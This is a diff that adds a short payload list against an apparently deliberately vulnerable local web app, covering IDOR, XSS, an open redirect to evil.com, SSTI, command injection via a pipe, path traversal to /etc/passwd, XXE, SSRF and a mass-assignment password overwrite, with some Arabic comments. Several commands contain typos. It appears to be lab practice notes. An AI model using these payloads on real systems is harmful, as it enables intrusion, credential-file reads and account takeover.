@@ -1,0 +1,31 @@
+1-)IDOR
+http://localhost:5000/profile?id=2/3/4
+
+2-)XSS
+http://localhost:5000/profile?id=<script>alert(22)</script>
+
+3-)Insecure Redirect
+http://localhost:5000/v1/redirect/?url=https://evil.com
+
+4-)SSTI Server Side Template Injection
+http://localhost:5000/?message={{7*7}}
+
+5-)RCE Remote Code Execution
+curl "http://localhost:5000/v1/status|ls" 
+
+6-)Path Traversal
+http://localhost:5000/v1/beer-pic/?picture=../../../../../../../etc/passwd
+
+7-)XXE XML external entity injection
+url -X POST http://localhost:5000/v1/new-beer-xm/ \
+  -H "Content-Typ: multpart/form-data" \
+  -F "file=@xxe.xml"
+
+8-)SSRF Server-Side Request Forgery
+curl "http://localhost:5000/?url=http://[::1]"
+
+9-)Mass Assignment(السيرفر بيسمح بتعديل اماكن حساسة مباشرة) & Horizontal Privilege Escalation(لما عدلت حساب مستخدم تاني) & Vertical Privilege Escalation(لما غيرت الرول من يوزر لي ادمن) --> PrivEsc Full Privilege Escalation
+curl -X PUT "http://localhost:5000/v1/user" \
+ -H "Content-Type: applcation/jsn" \
+ -d '{"pasword":"HACKED_BY_ABDO_ISLAM"}'
+
